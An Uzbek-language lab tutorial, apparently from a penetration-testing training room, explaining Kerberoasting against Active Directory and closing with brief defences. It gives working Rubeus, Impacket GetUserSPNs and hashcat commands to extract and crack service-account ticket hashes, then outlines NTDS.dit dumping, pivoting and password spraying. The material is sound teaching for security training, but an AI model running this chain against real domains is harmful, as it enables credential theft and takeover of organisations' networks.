**Kerberoasting - Eng Mashhur Kerberos Hujumlaridan biri**

Kerberoasting hujumi foydalanuvchiga ro‘yxatdan o‘tgan SPN ga ega har qanday xizmat uchun xizmat bileti (ticket) so‘rash va keyin ushbu ticket yordamida xizmat parolini buzish imkonini beradi. Agar xizmatda ro‘yxatdan o‘tgan SPN bo‘lsa, u Kerberoast qilinishi mumkin, ammo hujumning muvaffaqiyati parolning kuchli yoki osongina taxmin qilinishiga va buzilgan xizmat hisobining imtiyozlariga bog‘liq.

Kerberoast qilinishi mumkin bo‘lgan hisoblarni aniqlash uchun BloodHound kabi vositalarni tavsiya qilaman. Bu sizga Kerberoast qila oladigan hisoblar, ularning domain admin ekanligi va domen bilan qanday aloqalari borligini ko‘rish imkonini beradi. Bu mavzu biroz ushbu xonaning doirasidan tashqarida, lekin hujum uchun hisoblarni topishda ajoyib vositadir.

Hujumni amalga oshirish uchun biz Rubeus va Impacket vositalaridan foydalanamiz, shunda siz Kerberoasting uchun turli vositalarni tushunib olasiz. Kekeo va Invoke-Kerberoast kabi boshqa vositalar ham mavjud, lekin ularni o‘rganishni sizga qoldiraman.

Rubeus allaqachon mashinaga joylashtirilgan va downloads papkasida joylashgan.

---

**Usul 1 - Rubeus yordamida Kerberoasting**

1.) **cd Downloads** - Rubeus joylashgan papkaga o‘ting.

2.) **Rubeus.exe kerberoast** - Bu buyruq Kerberoast qilinishi mumkin bo‘lgan foydalanuvchilarning Kerberos hash larini chiqaradi.

Hash ni o‘zingizning hujum mashinangizga nusxalab, .txt fayliga joylang, shunda uni hashcat bilan buzishimiz mumkin.

Jarayonni tezlashtirish uchun o‘zgartirilgan rockyou parollar ro‘yxatini yuklab oling: [havola]

3.) **hashcat -m 13100 -a 0 hash.txt Pass.txt** - Endi hash ni bazing.

---

**Usul 2 - Impacket yordamida Kerberoasting**

**Impacket O‘rnatish**:

Impacketning 0.9.20 versiyasidan keyingi relizlari beqaror, shuning uchun 0.9.20 dan past versiyani o‘rnatishingizni maslahat beraman.

1.) **cd /opt** - vositalarni saqlash uchun tanlagan papkangizga o‘ting.

2.) https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19 manzilidan oldindan tayyorlangan paketni yuklab oling.

3.) **cd Impacket-0.9.19** - impacket papkasiga o‘ting.

4.) **pip install .** - bu barcha kerakli bog‘liqliklarni o‘rnatadi.

**Impacket yordamida Kerberoasting**:

1.) **cd /usr/share/doc/python3-impacket/examples/** - GetUserSPNs.py fayli joylashgan joyga o‘ting.

2.) **sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip MASHINA_IP -request** - Bu Rubeus singari nishon domendagi barcha Kerberoast qilinishi mumkin bo‘lgan hisoblar uchun Kerberos hash larini chiqaradi; ammo, bu nishon mashinasida bo‘lish shart emas va masofadan amalga oshirilishi mumkin.

3.) **hashcat -m 13100 -a 0 hash.txt Pass.txt** - Endi hash ni bazing.

---

**Xizmat Hisobi Nima Qila Oladi?**

Xizmat hisobi parolini buzganingizdan so‘ng, ma’lumotlarni chiqarish yoki ma’lumot to‘plashning turli usullari mavjud, bular xizmat hisobining domain admin ekanligiga bog‘liq. Agar xizmat hisobi domain admin bo‘lsa, siz golden/silver ticketga o‘xshash nazoratga ega bo‘lasiz va NTDS.dit ni dump qilish kabi ma’lumotlarni to‘plashingiz mumkin. Agar xizmat hisobi domain admin bo‘lmasa, siz uni boshqa tizimlarga kirish, pivot qilish yoki privilegiyalarni oshirish uchun ishlatishingiz yoki ushbu buzilgan parolni boshqa xizmat va domain admin hisoblariga "sprеy" qilish uchun ishlatishingiz mumkin; ko‘plab kompaniyalar o‘z xizmat yoki domain admin foydalanuvchilari uchun bir xil yoki o‘xshash parollardan foydalanishlari mumkin. Agar siz professional penetration testda ishtirok etayotgan bo‘lsangiz, kompaniya xavfni qanday ko‘rsatishingizni xohlayotganiga e’tibor bering, ko‘p hollarda ular ma’lumotlarni chiqarishingizni xohlamaydi va baholash doirasida xavfni ko‘rsatish uchun maqsad yoki jarayon belgilashadi.

---

**Kerberoastingdan Himoyalanish - O‘rmonni Himoya Qilish**

**Kerberoastingdan Himoyalanish Choralari**:

- **Kuchli Xizmat Parollari** - Agar xizmat hisoblarining parollari kuchli bo‘lsa, Kerberoasting samarasiz bo‘ladi.
- **Xizmat Hisoblarini Domain Admin Qilmang** - Xizmat hisoblari domain admin bo‘lishi shart emas, agar siz xizmat hisoblarini domain admin qilmasangiz, Kerberoasting unchalik samarali bo‘lmaydi.
